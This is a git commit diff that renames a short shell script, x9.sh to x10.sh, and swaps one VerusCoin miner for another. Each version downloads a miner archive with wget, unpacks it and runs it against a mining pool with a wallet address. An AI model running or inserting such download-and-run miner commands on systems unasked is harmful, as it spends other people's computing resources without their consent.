c9fa68ffa6930ee0e4e059ebd6178cee18f26dd8
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-30 23:04:28 -0300

    Update and rename x9.sh to x10.sh

---
+++ x10.sh
@@ -0,0 +1,5 @@
+# veruscoin
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.0/nheqminer-Linux-v0.8.0.tar.gz
+tar -xf nheqminer-Linux-v0.8.0.tar.gz
+cd nheqminer
+./nheqminer -v -l na.luckpool.net:3956 -u RV15qZeZ9qggbWznCwQ8mcvfyRrhB9zEEN.Rig1 -p x -t 4
--- x9.sh
+++
@@ -1,4 +0,0 @@
-# veruscoin
-wget https://github.com/nanopool/nanominer/releases/download/v3.7.6/nanominer-linux-3.7.6.tar.gz
-tar -xf nanominer-linux-3.7.6.tar.gz
-./nanominer -algo Verushash -wallet RVxwfn5TggLnYPgEAGQf8W7kes28QNQGJg.Rig001 -coin VRSC -pool1 na.luckpool.net:3956 -useSSL false -t 4
